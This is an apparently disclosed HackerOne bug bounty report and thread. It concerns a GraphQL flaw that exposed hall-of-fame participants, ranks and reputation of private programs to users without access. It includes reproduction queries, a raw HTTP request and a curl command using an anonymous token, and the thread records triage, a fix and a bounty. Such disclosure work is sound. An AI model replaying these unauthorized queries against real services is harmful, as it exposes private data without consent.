title: Team object exposes amount of participants in a private program to non-invited users

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
**Summary:**
Hello.

Similar to other reports, suddenly after the update with ordering users, the GraphQL API is exposing the amount of participants in a private program to non-invited users. This allows an attacker to retrieve the amount of participants in a private program, as well as their details.

**Description:**
Steps To Reproduce

Query, for example, ██████ via the GraphQL API. ██████ is known to have a private program running on HackerOne, and they do exist in the external directory.
```
query {
    team(handle: "█████") {
     participants { total_count  }
     about

}
}
```
You'll get the amount of participants, as well as their details if you query them. 
```
...
{ "data": { "team": {participants": { "total_count": 268 }, "about": "████" } } }
...
```

**Impact**

This leads to information disclosure. An attacker can expose the existence of a private program under the external program directory.

## Impact

This will eventually lead to information disclosure.

activities.message:
In order to reproduce this faster, you can make the following HTTP request, instead of using a GraphQL client (which just converts the query to JSON).

```
> POST /graphql HTTP/1.1
> Host: hackerone.com
> User-Agent: Firefox
> Cookie: <your-cookies>
> Content-Type: application/json
> x-auth-token: <your-auth-token>
> Accept: */*
> Content-Length: 157
| {"query":"query {\n\tteam(handle: \"███\") {\n\t participants { total_count, edges { rank, reputation, node { name } } }\n\t\t\n\t about\n\t\t\n}\n}"}

```

As  a response, you'll retrieve the following:

```
...
< {
<	"data": {
<		"team": {
<			"participants": {
<				"total_count": 268,
<				"edges": [
<					{
<						"rank": 1,
<						"reputation": █████████,
<						"node": {
<							"name": "████████"
<						}
<					},
...
```
activities.markdown_message:
In order to reproduce this faster, you can make the following HTTP request, instead of using a GraphQL client (which just converts the query to JSON).

> POST /graphql HTTP/1.1
> Host: hackerone.com
> User-Agent: Firefox
> Cookie: <your-cookies>
> Content-Type: application/json
> x-auth-token: <your-auth-token>
> Accept: */*
> Content-Length: 157
| {"query":"query {\n\tteam(handle: \"███\") {\n\t participants { total_count, edges { rank, reputation, node { name } } }\n\t\t\n\t about\n\t\t\n}\n}"}

As a response, you'll retrieve the following:

...
< {
<   "data": {
<       "team": {
<           "participants": {
<               "total_count": 268,
<               "edges": [
<                   {
<                       "rank": 1,
<                       "reputation": █████████,
<                       "node": {
<                           "name": "████████"
<                       }
<                   },
...

activities.message: Hi @kapytein - thanks for your report. I've checked this out and unfortunately, this is a common misconception amongst hackers participating in our program. We've poorly named the attribute. The participants are actually the people who have ever been recognized for a valid security vulnerability. You can actually verify this by looking up the number of recognized users on ████'s profile (right column). It's also something we've received before, but I'll just go ahead and close this as Informative. Please keep looking, I'm sure there are authorization problems in our GraphQL layer. Good luck and happy hacking!
activities.markdown_message: Hi @kapytein - thanks for your report. I've checked this out and unfortunately, this is a common misconception amongst hackers participating in our program. We've poorly named the attribute. The participants are actually the people who have ever been recognized for a valid security vulnerability. You can actually verify this by looking up the number of recognized users on ████'s profile (right column). It's also something we've received before, but I'll just go ahead and close this as Informative. Please keep looking, I'm sure there are authorization problems in our GraphQL layer. Good luck and happy hacking!

activities.message:
Hi,

Yes, I probably named it wrongly in my report, it's not hackers participating in our program, but those who have been recognized for a report. However, previously, you could not run this against private programs who are in the external directory, where you are not part of. Now, a user can easily know whether a program in the external directory is running a private program. 

Previously, the participants attribute returned null if you do not have access to the program - however, recently, it started returning the data. Probably since the last update on the GraphQL schema, on this attribute.

I've also written this down in the impact box of the report, but I'll explain it again:

**Note that I'm testing this from an account where I do not have access to the following programs**: ███, or ██████████. Both are running a policy in the external directory. Via above query, I can uncover whether they are running a private program or not - a program in the external directory is not running a private program when there are no 'participants' (users who are thanked for a security vulnerability). The results differ for both programs, and if I try to query against ████████ for example (which clearly does not have a private program),.I'll get a simply 0 for the total count of participants.

It is similar to reports https://hackerone.com/reports/347937 - you can check the amount of users who have been recognized for a valid security vulnerability of a private program, which has a policy in the external directory, while you are not part of the private program.

Probably something changed? But it would be awesome if you could review this report again. @jobert

It's not only the total count of participants (or: users who have been thanked for a security vulnerability), **but the reputation they retrieved from the program, current rank and so on**. The status of the program is thus also revealed (whether it's a sandbox or actual private program).

activities.message: You can also use the anonymous auth token `----` to reproduce this, with the above query.
activities.markdown_message: You can also use the anonymous auth token ---- to reproduce this, with the above query.

activities.message:
```
kapytein@boxje:~$ curl https://hackerone.com/graphql -XPOST --header "x-auth-token: ----" --data '{"query":"query {\n\tteam(handle: \"███████\") {\n\t participants { total_count, edges { rank, reputation, node { name } } }\n\t\t\n\t about\n\t\t\n}\n}"}' -v --header "Content-Type: application/json"
```

You can also make above request using curl to reproduce this issue. Note that ██████████ is under the external directory, and runs a private program. Note that we are using `----` as auth token (this is an auth token for anonymous users). **Do not change this to your own auth token in order to reproduce this issue properly.**

The attribute is exposing the hall of fame/thanks page of programs in the external directory, who are running a private program.
activities.markdown_message:
kapytein@boxje:~$ curl https://hackerone.com/graphql -XPOST --header "x-auth-token: ----" --data '{"query":"query {
	team(handle: \"███████\") {
	 participants { total_count, edges { rank, reputation, node { name } } }
		
	 about
		
}
}"}' -v --header "Content-Type: application/json"

You can also make above request using curl to reproduce this issue. Note that ██████████ is under the external directory, and runs a private program. Note that we are using ---- as auth token (this is an auth token for anonymous users). Do not change this to your own auth token in order to reproduce this issue properly.

The attribute is exposing the hall of fame/thanks page of programs in the external directory, who are running a private program.

activities.message: Hi @kapytein - thanks for your patience here! You were absolutely right. I came to the wrong conclusion based on your initial report. We had 9 (or so) other reports that reported the same behavior. You were actually the first one to bring it to our attention, so we've reopened the report and are triaging it. Thanks again, good find!
activities.markdown_message: Hi @kapytein - thanks for your patience here! You were absolutely right. I came to the wrong conclusion based on your initial report. We had 9 (or so) other reports that reported the same behavior. You were actually the first one to bring it to our attention, so we've reopened the report and are triaging it. Thanks again, good find!

activities.message: Hi @kapytein - like you said, this issue should be resolved by now. Thanks for checking, it's much appreciated!

activities.message: Hi @kapytein, @reymark_divino, @spectator, @flashdisk, @kunal94, @unknown_person, @ateek, @ragnar, @zseano, @afzalsayed96, @harry_mg, @bhavukjain1, @sandeep_hodkasia - thanks again for bringing this to our attention, it's much appreciated! We're going to award a $2,500 bounty to @kapytein for being the first one to have reported the vulnerability to us. Everyone will be recognized in our hall of fame. We're looking forward to receive vulnerabilities from all of you in the future. Happy hacking!

I would like to congratulate @kapytein for bringing out this issue and demonstrated with exact graphql query in which where it was a root cause issue upto node point.
Once again you deserved it man!
I would personally like to request Hackerone to please award him extra swag for demonstrating from graphql query upto node point where it was a root cause issue. :)

Best of luck for upcoming reports and hacking :)

Kunal :)

activities.message: Thank you for submitting this report to our bug bounty program. As part of our June/July bonus ladder experiment, we're rewarding you with a bonus based on your rank in the leaderboard. To see your rank, please check out @security. Happy hacking!

summaries.content:
> Similar to other reports, suddenly after the update with ordering users, the GraphQL API is exposing the amount of > participants in a private program to non-invited users. This allows an attacker to retrieve the amount of participants in a private program, as well as their details.

I guess I did not write this up properly, but after I noticed that in the GrapHQL schema, on the `team` object, the `order_by` selector was added, the `participants` attribute was exposing the hall of fame of private programs running policies in the external directory.

The updated HackerOne GraphQL schema can be found here: https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_schema.graphql. It's frequently updated, so keep an eye on it.
summaries.content_html:
Similar to other reports, suddenly after the update with ordering users, the GraphQL API is exposing the amount of > participants in a private program to non-invited users. This allows an attacker to retrieve the amount of participants in a private program, as well as their details.

I guess I did not write this up properly, but after I noticed that in the GrapHQL schema, on the team object, the order_by selector was added, the participants attribute was exposing the hall of fame of private programs running policies in the external directory.

The updated HackerOne GraphQL schema can be found here: https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_schema.graphql. It's frequently updated, so keep an eye on it.
